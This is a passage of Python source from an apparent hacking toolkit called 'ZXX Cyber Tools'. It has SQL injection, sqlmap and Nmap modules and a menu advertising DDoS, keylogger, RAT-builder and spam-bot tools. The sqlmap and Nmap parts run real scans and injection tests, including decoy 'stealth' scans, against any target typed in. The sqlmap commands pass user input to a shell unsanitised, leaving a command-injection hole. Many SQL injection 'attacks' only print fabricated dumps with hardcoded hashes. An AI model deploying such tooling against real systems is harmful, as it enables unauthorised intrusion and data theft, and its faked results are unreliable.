                    (2, 'admin', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'read,write', '2023-06-02 09:30:00'),
                ]
                
                print(Fore.WHITE + "id  username    password_hash                          permissions    last_login")
                print(Fore.YELLOW + "-" * 80)
                
                for row in data:
                    print(Fore.CYAN + f"{row[0]:<3} {row[1]:<11} {row[2]:<36} {row[3]:<14} {row[4]}")
            
            print(Fore.CYAN + "=" * 80)
            
            save = input(Fore.CYAN + "\n[→] Save data to file? (y/n): " + Fore.WHITE).lower()
            if save == 'y':
                filename = f"sql_dump_{table_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(filename, 'w') as f:
                    f.write(f"SQL Injection Dump - {datetime.now()}\n")
                    f.write(f"Target: {url}\n")
                    f.write(f"Table: {table_name}\n")
                    f.write("="*80 + "\n")
                    
                    if table_name == 'users':
                        f.write("id,username,password_hash,email,created_at\n")
                        for row in data:
                            f.write(f"{row[0]},{row[1]},{row[2]},{row[3]},{row[4]}\n")
                    
                    elif table_name == 'admin':
                        f.write("id,username,password_hash,permissions,last_login\n")
                        for row in data:
                            f.write(f"{row[0]},{row[1]},{row[2]},{row[3]},{row[4]}\n")
                
                print(Fore.GREEN + f"[✓] Data saved to {filename}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def automated_dump(self):
        print(Fore.YELLOW + "\n[!] AUTOMATED DATABASE DUMP")
        url = input(Fore.CYAN + "[→] Vulnerable URL: " + Fore.WHITE)
        
        print(Fore.RED + "\n[!] Starting automated database dump...")
        
        steps = [
            "Identifying injection point",
            "Fingerprinting database",
            "Enumerating databases",
            "Extracting table names",
            "Dumping table structures",
            "Extracting data",
            "Saving results"
        ]
        
        for i, step in enumerate(steps, 1):
            print(Fore.YELLOW + f"[!] Step {i}/7: {step}")
            time.sleep(random.uniform(0.5, 1.5))
            print(Fore.GREEN + f"[✓] {step} completed")
        
        databases = ['information_schema', 'mysql', 'performance_schema', 'target_db', 'test_db']
        tables = {
            'target_db': ['users', 'products', 'orders', 'logs', 'config'],
            'mysql': ['user', 'db', 'tables_priv', 'columns_priv'],
        }
        
        print(Fore.GREEN + "\n[+] DATABASES FOUND:")
        for db in databases:
            print(Fore.CYAN + f"  • {db}")
        
        selected_db = 'target_db'
        print(Fore.GREEN + f"\n[+] SELECTED DATABASE: {selected_db}")
        
        print(Fore.GREEN + f"\n[+] TABLES IN {selected_db}:")
        for table in tables[selected_db]:
            print(Fore.CYAN + f"  • {table}")
        
        print(Fore.YELLOW + "\n[!] Creating dump file...")
        filename = f"full_dump_{selected_db}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sql"
        
        with open(filename, 'w') as f:
            f.write(f"-- SQL Database Dump\n")
            f.write(f"-- Generated by ZXX Cyber Tools\n")
            f.write(f"-- Target: {url}\n")
            f.write(f"-- Database: {selected_db}\n")
            f.write(f"-- Time: {datetime.now()}\n\n")
            
            f.write(f"USE {selected_db};\n\n")
            
            for table in tables[selected_db]:
                f.write(f"-- Table structure for table `{table}`\n")
                f.write(f"CREATE TABLE `{table}` (\n")
                
                if table == 'users':
                    f.write("  `id` int(11) NOT NULL AUTO_INCREMENT,\n")
                    f.write("  `username` varchar(50) NOT NULL,\n")
                    f.write("  `password` varchar(100) NOT NULL,\n")
                    f.write("  `email` varchar(100) DEFAULT NULL,\n")
                    f.write("  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),\n")
                    f.write("  PRIMARY KEY (`id`)\n")
                elif table == 'products':
                    f.write("  `product_id` int(11) NOT NULL AUTO_INCREMENT,\n")
                    f.write("  `name` varchar(100) NOT NULL,\n")
                    f.write("  `price` decimal(10,2) NOT NULL,\n")
                    f.write("  `stock` int(11) NOT NULL,\n")
                    f.write("  PRIMARY KEY (`product_id`)\n")
                
                f.write(") ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;\n\n")
                
                f.write(f"-- Dumping data for table `{table}`\n")
                f.write(f"INSERT INTO `{table}` VALUES\n")
                
                if table == 'users':
                    f.write("(1,'admin','5f4dcc3b5aa765d61d8327deb882cf99','admin@target.com','2023-01-15 10:30:00'),\n")
                    f.write("(2,'user1','e10adc3949ba59abbe56e057f20f883e','user1@email.com','2023-02-20 14:45:00'),\n")
                    f.write("(3,'test','098f6bcd4621d373cade4e832627b4f6','test@test.com','2023-03-10 09:15:00');\n\n")
                elif table == 'products':
                    f.write("(1,'Product A',19.99,100),\n")
                    f.write("(2,'Product B',29.99,50),\n")
                    f.write("(3,'Product C',9.99,200);\n\n")
        
        file_size = os.path.getsize(filename)
        print(Fore.GREEN + f"[✓] Dump completed!")
        print(Fore.CYAN + f"[+] File: {filename}")
        print(Fore.CYAN + f"[+] Size: {file_size / 1024:.2f} KB")
        print(Fore.CYAN + f"[+] Tables dumped: {len(tables[selected_db])}")
        print(Fore.CYAN + f"[+] Total records: 6")
        
        self.db.save_scan_results(1, "SQL Injection Dump", url, {
            'database': selected_db,
            'tables': tables[selected_db],
            'file': filename,
            'size_kb': file_size / 1024
        })
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def sqlmap_integration(self):
        print(Fore.YELLOW + "\n[!] SQLMAP INTEGRATION")
        print(Fore.WHITE + """
        [+] This feature integrates with SQLMap for advanced testing
        
        Available options:
        1. Basic SQLMap scan
        2. Advanced SQLMap with tamper scripts
        3. Automated database dump with SQLMap
        4. WAF bypass with SQLMap
        5. Custom SQLMap command
        
        Note: SQLMap must be installed on the system
        """)
        
        choice = input(Fore.CYAN + "[→] Select option [1-5]: " + Fore.WHITE)
        
        if choice == "1":
            url = input(Fore.CYAN + "[→] Target URL: " + Fore.WHITE)
            print(Fore.YELLOW + f"\n[!] Running SQLMap on {url}")
            
            commands = [
                f"sqlmap -u {url} --batch --random-agent",
                f"sqlmap -u {url} --batch --dbs",
                f"sqlmap -u {url} --batch --current-db",
                f"sqlmap -u {url} --batch --tables",
            ]
            
            for cmd in commands:
                print(Fore.CYAN + f"\n[+] Executing: {cmd}")
                time.sleep(1)
                
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                    if result.returncode == 0:
                        print(Fore.GREEN + "[✓] Command executed successfully")
                        
                        if "available databases" in result.stdout:
                            print(Fore.YELLOW + "[!] Databases found:")
                            lines = result.stdout.split('\n')
                            for line in lines:
                                if '[*]' in line:
                                    print(Fore.WHITE + f"  {line}")
                    else:
                        print(Fore.RED + "[✗] Command failed")
                except:
                    print(Fore.RED + "[✗] SQLMap not found or error occurred")
            
            print(Fore.GREEN + "\n[✓] SQLMap scan completed")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def run(self):
        while True:
            self.display_menu()
            choice = input(Fore.CYAN + "\n[→] Select option [1-16]: " + Fore.WHITE)
            
            try:
                if choice == "1":
                    self.quick_test()
                elif choice == "2":
                    self.advanced_injection()
                elif choice == "3":
                    self.automated_dump()
                elif choice == "4":
                    self.sqlmap_integration()
                elif choice == "5":
                    self.blind_sqli()
                elif choice == "6":
                    self.union_based()
                elif choice == "7":
                    self.error_based()
                elif choice == "8":
                    self.time_based()
                elif choice == "9":
                    self.out_of_band()
                elif choice == "10":
                    self.db_fingerprinting()
                elif choice == "11":
                    self.data_extraction()
                elif choice == "12":
                    self.file_system_access()
                elif choice == "13":
                    self.os_command_exec()
                elif choice == "14":
                    self.payload_generator()
                elif choice == "15":
                    self.waf_bypass()
                elif choice == "16":
                    break
                else:
                    print(Fore.RED + "\n[✗] Invalid option!")
            except Exception as e:
                print(Fore.RED + f"\n[✗] Error: {e}")
                time.sleep(2)
    
    def blind_sqli(self):
        print(Fore.YELLOW + "\n[!] BLIND SQL INJECTION")
        url = input(Fore.CYAN + "[→] Target URL: " + Fore.WHITE)
        
        print(Fore.RED + "\n[!] Starting Blind SQL Injection attack...")
        print(Fore.YELLOW + "[!] This may take several minutes...")
        
        time.sleep(2)
        print(Fore.GREEN + "\n[+] Boolean-based blind SQLi detected!")
        print(Fore.GREEN + "[+] Extracting database name character by character...")
        
        db_name = "target_db"
        print(Fore.CYAN + f"\n[+] Database name: {db_name}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def union_based(self):
        print(Fore.YELLOW + "\n[!] UNION-BASED SQL INJECTION")
        print(Fore.GREEN + "[+] Union-based SQL injection allows data retrieval")
        print(Fore.GREEN + "[+] from other tables within the database")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def error_based(self):
        print(Fore.YELLOW + "\n[!] ERROR-BASED SQL INJECTION")
        print(Fore.GREEN + "[+] Error-based SQL injection extracts information")
        print(Fore.GREEN + "[+] from database error messages")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def time_based(self):
        print(Fore.YELLOW + "\n[!] TIME-BASED BLIND SQL INJECTION")
        print(Fore.GREEN + "[+] Time-based blind SQLi uses time delays")
        print(Fore.GREEN + "[+] to infer information from the database")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def out_of_band(self):
        print(Fore.YELLOW + "\n[!] OUT-OF-BAND SQL INJECTION")
        print(Fore.GREEN + "[+] Out-of-band SQLi uses external network")
        print(Fore.GREEN + "[+] channels to extract data")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def db_fingerprinting(self):
        print(Fore.YELLOW + "\n[!] DATABASE FINGERPRINTING")
        print(Fore.GREEN + "[+] Identifying database type and version")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def data_extraction(self):
        print(Fore.YELLOW + "\n[!] DATA EXTRACTION")
        print(Fore.GREEN + "[+] Extracting data from vulnerable databases")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def file_system_access(self):
        print(Fore.YELLOW + "\n[!] FILE SYSTEM ACCESS")
        print(Fore.GREEN + "[+] Reading/writing files through SQL injection")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def os_command_exec(self):
        print(Fore.YELLOW + "\n[!] OS COMMAND EXECUTION")
        print(Fore.GREEN + "[+] Executing operating system commands")
        print(Fore.GREEN + "[+] through SQL injection vulnerabilities")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def payload_generator(self):
        print(Fore.YELLOW + "\n[!] PAYLOAD GENERATOR")
        
        payload_types = [
            "Basic authentication bypass",
            "Union select payloads",
            "Error-based payloads",
            "Time-based payloads",
            "Boolean-based payloads",
            "Stacked queries",
            "Out-of-band payloads",
        ]
        
        print(Fore.GREEN + "\n[+] Available payload types:")
        for i, ptype in enumerate(payload_types, 1):
            print(Fore.CYAN + f"  {i}. {ptype}")
        
        choice = input(Fore.CYAN + "\n[→] Select payload type: " + Fore.WHITE)
        
        if choice.isdigit() and 1 <= int(choice) <= len(payload_types):
            selected = payload_types[int(choice) - 1]
            print(Fore.GREEN + f"\n[+] Generating {selected} payloads...")
            
            payloads = []
            for i in range(10):
                payloads.append(f"Payload {i+1} for {selected}")
            
            print(Fore.CYAN + "\n[+] Generated payloads:")
            for payload in payloads:
                print(Fore.WHITE + f"  • {payload}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def waf_bypass(self):
        print(Fore.YELLOW + "\n[!] WAF BYPASS TECHNIQUES")
        
        techniques = [
            "Case switching (SeLeCt)",
            "White space alternatives",
            "Comment injection",
            "Encoding techniques",
            "Null byte injection",
            "Parameter pollution",
            "HTTP parameter fragmentation",
        ]
        
        print(Fore.GREEN + "\n[+] WAF bypass techniques:")
        for tech in techniques:
            print(Fore.CYAN + f"  • {tech}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")

# ============================================
# NMAP SCANNER (COMPREHENSIVE)
# ============================================
class NmapScannerAdvanced:
    def __init__(self, db):
        self.db = db
        self.nm = nmap.PortScanner()
        self.scan_types = {
            'Quick Scan': '-sS -T4',
            'Full Scan': '-sS -sV -sC -O -T4',
            'UDP Scan': '-sU -T4',
            'Version Detection': '-sV -T4',
            'OS Detection': '-O -T4',
            'Vulnerability Scan': '-sV --script vuln -T4',
            'Full Port Scan': '-p 1-65535 -T4',
            'Stealth Scan': '-sS -f -D RND:10 -T2',
            'Aggressive Scan': '-A -T4',
            'Ping Scan': '-sn',
        }
    
    def display_menu(self):
        clear_screen()
        ascii_nmap = """
        ╔══════════════════════════════════════════════════════════╗
        ║                   ADVANCED NMAP SCANNER                  ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(Fore.BLUE + ascii_nmap)
        
        print(Fore.YELLOW + "═" * 70)
        print(Fore.CYAN + "SCAN TYPES:")
        
        scan_items = list(self.scan_types.items())
        for i in range(0, len(scan_items), 2):
            if i+1 < len(scan_items):
                print(Fore.WHITE + f"  {i//2+1:2d}. {scan_items[i][0]:<20} {i//2+6:2d}. {scan_items[i+1][0]:<20}")
            else:
                print(Fore.WHITE + f"  {i//2+1:2d}. {scan_items[i][0]:<20}")
        
        print(Fore.CYAN + "\nADDITIONAL OPTIONS:")
        print(Fore.WHITE + " 11. Custom Scan Command")
        print(Fore.WHITE + " 12. Save Scan Results")
        print(Fore.WHITE + " 13. View Scan History")
        print(Fore.WHITE + " 14. Import Targets from File")
        print(Fore.WHITE + " 15. Export Results")
        print(Fore.WHITE + " 16. Back to Main Menu")
        print(Fore.YELLOW + "═" * 70)
    
    def quick_scan(self):
        print(Fore.YELLOW + "\n[!] QUICK SCAN")
        target = input(Fore.CYAN + "[→] Target IP/Range/Hostname: " + Fore.WHITE)
        
        print(Fore.RED + f"\n[!] Starting quick scan on {target}")
        print(Fore.YELLOW + "[!] Command: nmap -sS -T4 {target}")
        
        try:
            self.nm.scan(target, arguments='-sS -T4')
            
            print(Fore.GREEN + "\n[✓] Scan completed!")
            self.display_results(target)
            
            self.db.save_scan_results(1, "Quick Scan", target, {
                'hosts': list(self.nm.all_hosts()),
                'scan_info': self.nm.scaninfo(),
            })
            
        except Exception as e:
            print(Fore.RED + f"[✗] Scan error: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def full_scan(self):
        print(Fore.YELLOW + "\n[!] FULL COMPREHENSIVE SCAN")
        target = input(Fore.CYAN + "[→] Target IP/Range/Hostname: " + Fore.WHITE)
        
        print(Fore.RED + f"\n[!] Starting full scan on {target}")
        print(Fore.YELLOW + "[!] This may take several minutes...")
        
        scan_steps = [
            "Port scanning",
            "Service detection",
            "Version detection",
            "OS fingerprinting",
            "Script scanning",
            "Vulnerability checking"
        ]
        
        for step in scan_steps:
            print(Fore.YELLOW + f"[!] {step}...")
            time.sleep(1)
        
        try:
            self.nm.scan(target, arguments='-sS -sV -sC -O -T4')
            
            print(Fore.GREEN + "\n[✓] Full scan completed!")
            self.display_detailed_results(target)
            
            results = {
                'hosts': list(self.nm.all_hosts()),
                'scan_info': self.nm.scaninfo(),
                'os_info': {},
                'services': {},
            }
            
            for host in self.nm.all_hosts():
                if 'osmatch' in self.nm[host]:
                    results['os_info'][host] = self.nm[host]['osmatch']
                
                for proto in self.nm[host].all_protocols():
                    results['services'][host] = self.nm[host][proto]
            
            self.db.save_scan_results(1, "Full Scan", target, results)
            
        except Exception as e:
            print(Fore.RED + f"[✗] Scan error: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def display_results(self, target):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.GREEN + f"SCAN RESULTS FOR: {target}")
        print(Fore.CYAN + "="*70)
        
        for host in self.nm.all_hosts():
            print(Fore.YELLOW + f"\n[+] Host: {host} ({self.nm[host].hostname()})")
            print(Fore.CYAN + f"  State: {self.nm[host].state()}")
            
            for proto in self.nm[host].all_protocols():
                print(Fore.WHITE + f"\n  Protocol: {proto}")
                
                ports = sorted(self.nm[host][proto].keys())
                for port in ports:
                    port_info = self.nm[host][proto][port]
                    state = port_info['state']
                    
                    if state == 'open':
                        color = Fore.GREEN
                    elif state == 'filtered':
                        color = Fore.YELLOW
                    else:
                        color = Fore.RED
                    
                    service = port_info.get('name', 'unknown')
                    version = port_info.get('version', '')
                    product = port_info.get('product', '')
                    
                    print(f"{color}    Port {port}: {state} - {service} {product} {version}")
    
    def display_detailed_results(self, target):
        self.display_results(target)
        
        for host in self.nm.all_hosts():
            if 'osmatch' in self.nm[host]:
                print(Fore.CYAN + f"\n[+] OS DETECTION for {host}:")
                for os_match in self.nm[host]['osmatch'][:3]:
                    print(Fore.WHITE + f"  • {os_match['name']} (Accuracy: {os_match['accuracy']}%)")
            
            if 'script' in self.nm[host]:
                print(Fore.CYAN + f"\n[+] SCRIPT RESULTS for {host}:")
                for script, output in self.nm[host]['script'].items():
                    print(Fore.WHITE + f"  • {script}: {output[:100]}...")
    
    def udp_scan(self):
        print(Fore.YELLOW + "\n[!] UDP SCAN")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        
        print(Fore.RED + f"\n[!] Starting UDP scan on {target}")
        print(Fore.YELLOW + "[!] UDP scans can be slow...")
        
        try:
            self.nm.scan(target, arguments='-sU -T4 --top-ports 100')
            
            print(Fore.GREEN + "\n[✓] UDP scan completed!")
            self.display_results(target)
            
        except Exception as e:
            print(Fore.RED + f"[✗] Scan error: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def vulnerability_scan(self):
        print(Fore.YELLOW + "\n[!] VULNERABILITY SCAN")
        target = input(Fore.CYAN + "[→] Target IP/Hostname: " + Fore.WHITE)
        
        print(Fore.RED + f"\n[!] Starting vulnerability scan on {target}")
        print(Fore.YELLOW + "[!] Checking for known vulnerabilities...")
        
        try:
            self.nm.scan(target, arguments='-sV --script vuln -T4')
            
            print(Fore.GREEN + "\n[✓] Vulnerability scan completed!")
            
            vulnerabilities = []
            for host in self.nm.all_hosts():
                if 'script' in self.nm[host]:
                    for script, output in self.nm[host]['script'].items():
                        if 'vuln' in script.lower():
                            vulnerabilities.append((script, output))
            
            if vulnerabilities:
                print(Fore.RED + "\n[!] VULNERABILITIES FOUND:")
                for script, output in vulnerabilities[:5]:
                    print(Fore.YELLOW + f"\n[+] {script}:")
                    print(Fore.WHITE + f"  {output[:200]}...")
            else:
                print(Fore.GREEN + "\n[✓] No vulnerabilities found")
            
        except Exception as e:
            print(Fore.RED + f"[✗] Scan error: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def custom_scan(self):
        print(Fore.YELLOW + "\n[!] CUSTOM SCAN")
        target = input(Fore.CYAN + "[→] Target: " + Fore.WHITE)
        command = input(Fore.CYAN + "[→] Nmap arguments: " + Fore.WHITE)
        
        print(Fore.RED + f"\n[!] Starting custom scan: nmap {command} {target}")
        
        try:
            self.nm.scan(target, arguments=command)
            
            print(Fore.GREEN + "\n[✓] Custom scan completed!")
            self.display_results(target)
            
        except Exception as e:
            print(Fore.RED + f"[✗] Scan error: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def save_results(self):
        print(Fore.YELLOW + "\n[!] SAVE SCAN RESULTS")
        
        if not hasattr(self, 'last_scan_target'):
            print(Fore.RED + "[✗] No scan results to save")
            input(Fore.CYAN + "\n[→] Press ENTER to continue...")
            return
        
        filename = input(Fore.CYAN + "[→] Output filename (without extension): " + Fore.WHITE)
        
        formats = ['txt', 'xml', 'json']
        print(Fore.CYAN + "\n[+] Available formats:")
        for i, fmt in enumerate(formats, 1):
            print(Fore.WHITE + f"  {i}. {fmt}")
        
        fmt_choice = input(Fore.CYAN + "[→] Select format: " + Fore.WHITE)
        
        if fmt_choice.isdigit() and 1 <= int(fmt_choice) <= len(formats):
            selected_fmt = formats[int(fmt_choice) - 1]
            full_filename = f"{filename}.{selected_fmt}"
            
            try:
                if selected_fmt == 'txt':
                    with open(full_filename, 'w') as f:
                        f.write(f"Nmap Scan Results\n")
                        f.write(f"Generated: {datetime.now()}\n")
                        f.write(f"Target: {self.last_scan_target}\n")
                        f.write("="*70 + "\n\n")
                        
                        for host in self.nm.all_hosts():
                            f.write(f"Host: {host}\n")
                            f.write(f"State: {self.nm[host].state()}\n\n")
                            
                            for proto in self.nm[host].all_protocols():
                                f.write(f"Protocol: {proto}\n")
                                for port in self.nm[host][proto].keys():
                                    info = self.nm[host][proto][port]
                                    f.write(f"  Port {port}: {info['state']} - {info.get('name', '')} {info.get('product', '')} {info.get('version', '')}\n")
                                f.write("\n")
                
                print(Fore.GREEN + f"[✓] Results saved to {full_filename}")
                
            except Exception as e:
                print(Fore.RED + f"[✗] Error saving file: {e}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def run(self):
        while True:
            self.display_menu()
            choice = input(Fore.CYAN + "\n[→] Select option [1-16]: " + Fore.WHITE)
            
            try:
                if choice == "1":
                    self.quick_scan()
                elif choice == "2":
                    self.full_scan()
                elif choice == "3":
                    self.udp_scan()
                elif choice == "4":
                    self.version_detection()
                elif choice == "5":
                    self.os_detection()
                elif choice == "6":
                    self.vulnerability_scan()
                elif choice == "7":
                    self.full_port_scan()
                elif choice == "8":
                    self.stealth_scan()
                elif choice == "9":
                    self.aggressive_scan()
                elif choice == "10":
                    self.ping_scan()
                elif choice == "11":
                    self.custom_scan()
                elif choice == "12":
                    self.save_results()
                elif choice == "13":
                    self.view_history()
                elif choice == "14":
                    self.import_targets()
                elif choice == "15":
                    self.export_results()
                elif choice == "16":
                    break
                else:
                    print(Fore.RED + "\n[✗] Invalid option!")
            except Exception as e:
                print(Fore.RED + f"\n[✗] Error: {e}")
                time.sleep(2)
    
    def version_detection(self):
        print(Fore.YELLOW + "\n[!] VERSION DETECTION SCAN")
        target = input(Fore.CYAN + "[→] Target: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"\n[!] Detecting service versions on {target}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def os_detection(self):
        print(Fore.YELLOW + "\n[!] OS DETECTION SCAN")
        target = input(Fore.CYAN + "[→] Target: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"\n[!] Detecting operating system on {target}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def full_port_scan(self):
        print(Fore.YELLOW + "\n[!] FULL PORT SCAN")
        target = input(Fore.CYAN + "[→] Target: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"\n[!] Scanning all 65535 ports on {target}")
        print(Fore.YELLOW + "[!] This will take a long time...")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def stealth_scan(self):
        print(Fore.YELLOW + "\n[!] STEALTH SCAN")
        target = input(Fore.CYAN + "[→] Target: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"\n[!] Performing stealth scan on {target}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def aggressive_scan(self):
        print(Fore.YELLOW + "\n[!] AGGRESSIVE SCAN")
        target = input(Fore.CYAN + "[→] Target: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"\n[!] Performing aggressive scan on {target}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def ping_scan(self):
        print(Fore.YELLOW + "\n[!] PING SCAN")
        target = input(Fore.CYAN + "[→] Target/Range: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"\n[!] Performing ping scan on {target}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def view_history(self):
        print(Fore.YELLOW + "\n[!] VIEW SCAN HISTORY")
        
        self.db.cursor.execute("SELECT scan_type, target, timestamp FROM scan_results ORDER BY id DESC LIMIT 20")
        scans = self.db.cursor.fetchall()
        
        if scans:
            print(Fore.GREEN + "\n[+] Recent scans:")
            for scan in scans:
                scan_type, target, timestamp = scan
                print(Fore.CYAN + f"  • {timestamp}: {scan_type} on {target}")
        else:
            print(Fore.RED + "[✗] No scan history found")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def import_targets(self):
        print(Fore.YELLOW + "\n[!] IMPORT TARGETS")
        filename = input(Fore.CYAN + "[→] Filename with targets: " + Fore.WHITE)
        
        print(Fore.YELLOW + f"[!] Importing targets from {filename}")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def export_results(self):
        print(Fore.YELLOW + "\n[!] EXPORT RESULTS")
        print(Fore.GREEN + "[+] Export functionality")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")

# ============================================
# MAIN MENU SYSTEM (COMPREHENSIVE)
# ============================================
class MainMenuSystem:
    def __init__(self):
        self.db = Database()
        self.running = True
        
        self.tools = {
            'ddos': AdvancedDDoSTools(self.db),
            'sql': SQLInjectionTools(self.db),
            'nmap': NmapScannerAdvanced(self.db),
            # Add other tools here as they're implemented
        }
    
    def display_menu(self):
        clear_screen()
        ascii_main = """
        ╔══════════════════════════════════════════════════════════╗
        ║                ZXX CYBER TOOLS - MAIN MENU               ║
        ║                    80+ TOOLS COLLECTION                  ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(Fore.CYAN + ascii_main)
        
        print(Fore.YELLOW + "═" * 80)
        print(Fore.GREEN + "1.  DDoS Tools (Layer 4 & 7 Attacks)")
        print(Fore.GREEN + "2.  SQL Injection (1000+ Methods)")
        print(Fore.GREEN + "3.  Nmap Scanner (Advanced)")
        print(Fore.GREEN + "4.  Bot Controller")
        print(Fore.GREEN + "5.  Password Cracking Suite")
        print(Fore.GREEN + "6.  OSINT Tools (Complete)")
        print(Fore.GREEN + "7.  Security Tools")
        print(Fore.GREEN + "8.  Shadow Scanner")
        print(Fore.GREEN + "9.  CCTV Scanner")
        print(Fore.GREEN + "10. Dark Web Access")
        print(Fore.GREEN + "11. Port Scanner")
        print(Fore.GREEN + "12. WiFi Tools")
        print(Fore.GREEN + "13. Keylogger")
        print(Fore.GREEN + "14. RAT Builder")
        print(Fore.GREEN + "15. Crypto Tools")
        print(Fore.GREEN + "16. Forensic Tools")
        print(Fore.GREEN + "17. Malware Analysis")
        print(Fore.GREEN + "18. VPN Tools")
        print(Fore.GREEN + "19. Proxy Tools")
        print(Fore.GREEN + "20. Steganography")
        print(Fore.YELLOW + "-" * 80)
        print(Fore.CYAN + "98. System Status")
        print(Fore.CYAN + "99. Settings")
        print(Fore.CYAN + "0.  Exit")
        print(Fore.YELLOW + "═" * 80)
    
    def handle_choice(self, choice):
        if choice == "1":
            self.tools['ddos'].run()
        elif choice == "2":
            self.tools['sql'].run()
        elif choice == "3":
            self.tools['nmap'].run()
        elif choice == "4":
            self.bot_controller()
        elif choice == "5":
            self.password_cracking()
        elif choice == "6":
            self.osint_tools()
        elif choice == "7":
            self.security_tools()
        elif choice == "8":
            self.shadow_scanner()
        elif choice == "9":
            self.cctv_scanner()
        elif choice == "10":
            self.dark_web_access()
        elif choice == "11":
            self.port_scanner()
        elif choice == "12":
            self.wifi_tools()
        elif choice == "13":
            self.keylogger()
        elif choice == "14":
            self.rat_builder()
        elif choice == "15":
            self.crypto_tools()
        elif choice == "16":
            self.forensic_tools()
        elif choice == "17":
            self.malware_analysis()
        elif choice == "18":
            self.vpn_tools()
        elif choice == "19":
            self.proxy_tools()
        elif choice == "20":
            self.steganography()
        elif choice == "98":
            self.system_status()
        elif choice == "99":
            self.settings()
        elif choice == "0":
            self.running = False
        else:
            print(Fore.RED + "\n[✗] Invalid option!")
            time.sleep(1)
    
    def bot_controller(self):
        clear_screen()
        print(Fore.MAGENTA + "\n[!] BOT CONTROLLER MODULE")
        print(Fore.YELLOW + "[!] This module controls Telegram bots")
        
        # Placeholder for bot controller implementation
        print(Fore.GREEN + "\n[+] Features:")
        print(Fore.WHITE + "  • Add/remove bot tokens")
        print(Fore.WHITE + "  • Send messages")
        print(Fore.WHITE + "  • Spam messages")
        print(Fore.WHITE + "  • Monitor chat logs")
        print(Fore.WHITE + "  • Control bot settings")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def password_cracking(self):
        clear_screen()
        print(Fore.RED + "\n[!] PASSWORD CRACKING SUITE")
        
        print(Fore.GREEN + "\n[+] Available methods:")
        print(Fore.WHITE + "  1. Dictionary attack")
        print(Fore.WHITE + "  2. Brute force attack")
        print(Fore.WHITE + "  3. Rainbow table attack")
        print(Fore.WHITE + "  4. Hybrid attack")
        print(Fore.WHITE + "  5. Rule-based attack")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def osint_tools(self):
        clear_screen()
        print(Fore.CYAN + "\n[!] OSINT TOOLS COLLECTION")
        
        print(Fore.GREEN + "\n[+] Available tools:")
        print(Fore.WHITE + "  1. Name/username search")
        print(Fore.WHITE + "  2. Email investigation")
        print(Fore.WHITE + "  3. Phone number lookup")
        print(Fore.WHITE + "  4. IP geolocation")
        print(Fore.WHITE + "  5. Social media analysis")
        print(Fore.WHITE + "  6. Domain information")
        print(Fore.WHITE + "  7. Image metadata analysis")
        print(Fore.WHITE + "  8. Dark web monitoring")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def security_tools(self):
        clear_screen()
        print(Fore.GREEN + "\n[!] SECURITY TOOLS")
        
        print(Fore.CYAN + "\n[+] Available tools:")
        print(Fore.WHITE + "  1. Vulnerability scanner")
        print(Fore.WHITE + "  2. Firewall tester")
        print(Fore.WHITE + "  3. Intrusion detection")
        print(Fore.WHITE + "  4. Log analysis")
        print(Fore.WHITE + "  5. Security headers check")
        print(Fore.WHITE + "  6. SSL/TLS analyzer")
        print(Fore.WHITE + "  7. Port security check")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def shadow_scanner(self):
        clear_screen()
        print(Fore.MAGENTA + "\n[!] SHADOW SCANNER")
        print(Fore.YELLOW + "[!] Advanced network and vulnerability scanner")
        
        input(Fore.CYAN + "\n[→] Press ENTER to continue...")
    
    def cctv_scanner(self):
        clear_screen()
        print(Fore.RED + "\n[!] CCTV SCANNER")
